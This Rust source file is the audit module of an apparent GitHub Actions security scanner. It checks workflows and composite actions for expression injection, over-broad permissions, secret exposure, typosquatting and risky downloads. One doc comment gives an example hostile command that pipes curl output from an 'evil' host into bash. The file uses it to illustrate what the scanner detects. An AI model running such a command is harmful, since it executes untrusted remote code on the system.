mod cross_workflow;
mod external_artifacts;
mod injection;
pub(crate) mod oidc;
mod permissions;
mod supply_chain;
mod triggers;

pub(crate) use supply_chain::check_untrusted_sources;

use std::path::PathBuf;
use std::sync::OnceLock;
use yaml_rust2::Yaml;

// ─── Finding types ───────────────────────────────────────────────────────────

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct AuditFinding {
    pub(crate) file: PathBuf,
    pub(crate) severity: Severity,
    pub(crate) title: String,
    pub(crate) detail: String,
    pub(crate) is_warning: bool,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub(crate) enum Severity {
    Critical,
    High,
    Medium,
}

impl std::fmt::Display for Severity {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Critical => write!(f, "CRIT"),
            Self::High => write!(f, "HIGH"),
            Self::Medium => write!(f, "MED"),
        }
    }
}

// ─── Data lists loaded from external files (embedded at compile time) ────────

pub(super) fn lines(text: &str) -> Vec<&str> {
    text.lines().filter(|l| !l.is_empty()).collect()
}

pub(super) fn injectable_contexts() -> &'static [&'static str] {
    static DATA: OnceLock<Vec<&str>> = OnceLock::new();
    DATA.get_or_init(|| lines(include_str!("../../data/injectable_contexts.txt")))
}

fn trusted_owners() -> &'static [String] {
    static DATA: OnceLock<Vec<String>> = OnceLock::new();
    DATA.get_or_init(|| {
        include_str!("../../data/trusted_owners.txt")
            .lines()
            .filter(|l| !l.is_empty())
            .map(str::to_lowercase)
            .collect()
    })
}

pub(super) fn popular_actions() -> &'static [&'static str] {
    static DATA: OnceLock<Vec<&str>> = OnceLock::new();
    DATA.get_or_init(|| lines(include_str!("../../data/popular_actions.txt")))
}

pub(super) fn privileged_actions() -> &'static [String] {
    static DATA: OnceLock<Vec<String>> = OnceLock::new();
    DATA.get_or_init(|| {
        include_str!("../../data/privileged_actions.txt")
            .lines()
            .filter(|l| !l.is_empty())
            .map(str::to_lowercase)
            .collect()
    })
}

pub(super) fn privileged_action_keywords() -> &'static [String] {
    static DATA: OnceLock<Vec<String>> = OnceLock::new();
    DATA.get_or_init(|| {
        include_str!("../../data/privileged_action_keywords.txt")
            .lines()
            .filter(|l| !l.is_empty())
            .map(str::to_lowercase)
            .collect()
    })
}

pub(super) fn high_impact_secret_hints() -> &'static [&'static str] {
    static DATA: OnceLock<Vec<&str>> = OnceLock::new();
    DATA.get_or_init(|| lines(include_str!("../../data/high_impact_secret_hints.txt")))
}

// ─── Cached YAML key accessors (avoid repeated heap allocation) ──────────────

macro_rules! yaml_key {
    ($fn_name:ident, $key:expr) => {
        pub(super) fn $fn_name() -> &'static Yaml {
            static K: OnceLock<Yaml> = OnceLock::new();
            K.get_or_init(|| Yaml::String($key.to_string()))
        }
    };
}

yaml_key!(key_jobs, "jobs");
yaml_key!(key_steps, "steps");
yaml_key!(key_uses, "uses");
yaml_key!(key_env, "env");
yaml_key!(key_name, "name");
yaml_key!(key_with, "with");
yaml_key!(key_run, "run");
yaml_key!(key_if, "if");
yaml_key!(key_permissions, "permissions");
yaml_key!(key_secrets, "secrets");
yaml_key!(key_ref, "ref");
yaml_key!(key_repository, "repository");
yaml_key!(key_persist_credentials, "persist-credentials");
yaml_key!(key_on, "on");

// ─── Shared expression finder ────────────────────────────────────────────────

pub(super) fn find_expressions(text: &str) -> Vec<&str> {
    let bytes = text.as_bytes();
    let mut exprs = Vec::new();
    let mut cursor = 0;
    while let Some(rel) = text[cursor..].find("${{") {
        let abs = cursor + rel + 3;
        // Find the closing `}}`, skipping any `}}` that appears inside a quoted
        // string literal — otherwise `${{ '}}' == github.event.issue.title }}`
        // truncates at the literal and the real context is never scanned.
        let mut pos = abs;
        let mut quote: Option<u8> = None;
        let mut close: Option<usize> = None;
        while pos < bytes.len() {
            let byte = bytes[pos];
            match quote {
                Some(open) => {
                    if byte == open {
                        quote = None;
                    }
                }
                None => {
                    if byte == b'\'' || byte == b'"' {
                        quote = Some(byte);
                    } else if byte == b'}' && pos + 1 < bytes.len() && bytes[pos + 1] == b'}' {
                        close = Some(pos);
                        break;
                    }
                }
            }
            pos += 1;
        }
        match close {
            Some(end) => {
                exprs.push(&text[abs..end]);
                cursor = end + 2;
            }
            None => break,
        }
    }
    exprs
}

/// Normalize a GitHub Actions expression body so a single dotted-substring test
/// catches every equivalent spelling. Lowercases (contexts are
/// case-insensitive), rewrites index access `['x']` / `["x"]` into dotted `.x`,
/// and strips whitespace — so `github['event']['issue']['title']`,
/// `github.event.issue['title']`, and `github.event.issue.TITLE` all normalize
/// to `github.event.issue.title`.
pub(super) fn normalize_expr(expr: &str) -> String {
    let mut out = String::with_capacity(expr.len());
    for ch in expr.chars() {
        match ch {
            '[' => out.push('.'),
            ']' | '\'' | '"' => {}
            c if c.is_whitespace() => {}
            c => out.push(c.to_ascii_lowercase()),
        }
    }
    out
}

/// True when a `uses:` value references `actions/checkout` (the repo owner/name
/// are case-insensitive on GitHub) at a component boundary, so `Actions/Checkout`
/// matches but `actions/checkout-helper` does not.
pub(super) fn is_checkout_action(uses: &str) -> bool {
    let lower = uses.to_ascii_lowercase();
    let Some(rest) = lower.strip_prefix("actions/checkout") else {
        return false;
    };
    rest.is_empty() || rest.starts_with('@') || rest.starts_with('/')
}

/// Audit the `runs.steps` of LOCAL composite actions (`action.yml`). Those
/// steps execute in the caller's context but are NOT `jobs`, so the
/// workflow-shaped checks in [`run`] never see them — a composite action with
/// `run: curl https://evil | bash` or a `${{ github.event.* }}` injection would
/// otherwise go completely unaudited. We run the run-block checks (script
/// injection, external-artifact downloads) over each composite step.
pub(crate) fn run_composite(
    docs: &[(PathBuf, Yaml)],
    checks: &crate::policy::CheckConfig,
) -> Vec<AuditFinding> {
    let mut findings = Vec::new();
    if checks.expression_injection.is_off() && checks.external_artifacts.is_off() {
        return findings;
    }
    for (file, doc) in docs {
        let Some(steps) = doc
            .as_hash()
            .and_then(|m| m.get(&Yaml::String("runs".to_string())))
            .and_then(Yaml::as_hash)
            .and_then(|r| r.get(key_steps()))
            .and_then(Yaml::as_vec)
        else {
            continue;
        };
        for step in steps {
            let Some(step_map) = step.as_hash() else {
                continue;
            };
            let step_name = step_map
                .get(key_name())
                .and_then(Yaml::as_str)
                .unwrap_or("<unnamed step>");

            if let Some(run) = step_map.get(key_run()).and_then(Yaml::as_str) {
                if !checks.expression_injection.is_off() {
                    injection::check_script_injection(
                        file,
                        step_name,
                        run,
                        Severity::Critical,
                        &mut findings,
                        checks.expression_injection,
                    );
                }
                if !checks.external_artifacts.is_off() {
                    // A composite action runs with the caller's token; treat it
                    // as privileged (conservative) and PR-reachable-agnostic.
                    external_artifacts::check_run_block(
                        file,
                        run,
                        false,
                        true,
                        &mut findings,
                        checks.external_artifacts.is_warn(),
                    );
                }
            }

            if !checks.expression_injection.is_off()
                && let Some(with_map) = step_map.get(key_with()).and_then(Yaml::as_hash)
            {
                for (_key, val) in with_map {
                    if let Some(val_str) = val.as_str() {
                        injection::check_script_injection(
                            file,
                            step_name,
                            val_str,
                            Severity::High,
                            &mut findings,
                            checks.expression_injection,
                        );
                    }
                }
            }
        }
    }
    findings
}

// ─── Run dispatcher ──────────────────────────────────────────────────────────

pub(crate) fn run(
    docs: &[(PathBuf, Yaml)],
    refs: &[crate::scanner::ActionRef],
    checks: &crate::policy::CheckConfig,
) -> Vec<AuditFinding> {
    let mut findings = Vec::new();
    for (file, doc) in docs {
        if !checks.permissions.is_off() {
            permissions::check_permissions(file, doc, &mut findings, checks.permissions);
        }
        if !checks.expression_injection.is_off() {
            injection::check_expression_injection(
                file,
                doc,
                &mut findings,
                checks.expression_injection,
            );
        }
        if !checks.privileged_triggers.is_off() {
            triggers::check_privileged_triggers(
                file,
                doc,
                &mut findings,
                checks.privileged_triggers,
            );
        }
        if !checks.secret_exposure.is_off() {
            supply_chain::check_secret_exposure(file, doc, &mut findings, checks.secret_exposure);
        }
        if !checks.github_env_writes.is_off() {
            injection::check_github_env_writes(file, doc, &mut findings, checks.github_env_writes);
        }
        if !checks.secrets_inherit.is_off() {
            permissions::check_secrets_inherit(file, doc, &mut findings, checks.secrets_inherit);
        }
        if !checks.contains_bypass.is_off() {
            triggers::check_unsound_contains(file, doc, &mut findings, checks.contains_bypass);
        }
        if !checks.persist_credentials.is_off() {
            permissions::check_checkout_persist_credentials(
                file,
                doc,
                &mut findings,
                checks.persist_credentials,
            );
        }
    }
    if !checks.typosquatting.is_off() {
        supply_chain::check_typosquatting(refs, &mut findings, checks.typosquatting);
    }
    if !checks.cross_workflow.is_off() {
        cross_workflow::run(docs, &mut findings, checks.cross_workflow);
    }
    if !checks.external_artifacts.is_off() {
        external_artifacts::run(docs, &mut findings, checks.external_artifacts);
    }
    // Sort by severity: Critical < High < Medium (ascending order)
    // Severity derives Ord based on declaration order: Critical=0, High=1, Medium=2
    findings.sort_by_key(|f| f.severity);
    findings
}

/// Expose built-in trusted owners list for policy composition.
pub(crate) fn builtin_trusted_owners() -> &'static [String] {
    trusted_owners()
}

pub(crate) fn is_trusted_owner(owner: &str) -> bool {
    is_trusted_owner_in(owner, trusted_owners())
}

/// Check trust against a custom list (from policy `trust.owners`).
pub(crate) fn is_trusted_owner_in(owner: &str, list: &[String]) -> bool {
    let owner_lower = owner.to_lowercase();
    list.contains(&owner_lower)
}

pub(crate) fn is_privileged_action(owner: &str, repo: &str, path: Option<&str>) -> bool {
    let mut target = format!("{}/{}", owner.to_lowercase(), repo.to_lowercase());
    if let Some(path) = path {
        target.push('/');
        target.push_str(&path.to_lowercase());
    }

    if privileged_actions().iter().any(|known| known == &target) {
        return true;
    }

    privileged_action_keywords()
        .iter()
        .any(|keyword| target.contains(keyword.as_str()))
}

// ─── Tests ───────────────────────────────────────────────────────────────────

/// Shared test helpers used by submodule tests.
#[cfg(test)]
#[allow(clippy::unwrap_used)]
pub(super) mod tests_common {
    pub(crate) use super::AuditFinding;
    use super::*;
    use crate::scanner::{ActionRef, RefKind};
    use std::path::PathBuf;
    use yaml_rust2::YamlLoader;

    pub(crate) fn run_audit(src: &str) -> Vec<AuditFinding> {
        let doc = YamlLoader::load_from_str(src).unwrap().remove(0);
        run(
            &[(PathBuf::from("workflow.yml"), doc)],
            &[],
            &crate::policy::CheckConfig::default(),
        )
    }

    pub(crate) fn action_ref(owner: &str, repo: &str) -> ActionRef {
        ActionRef {
            file: PathBuf::from("workflow.yml"),
            owner: owner.to_string(),
            repo: repo.to_string(),
            path: None,
            ref_str: "0123456789012345678901234567890123456789".to_string(),
            ref_kind: RefKind::FullSha,
            comment_version: None,
        }
    }
}
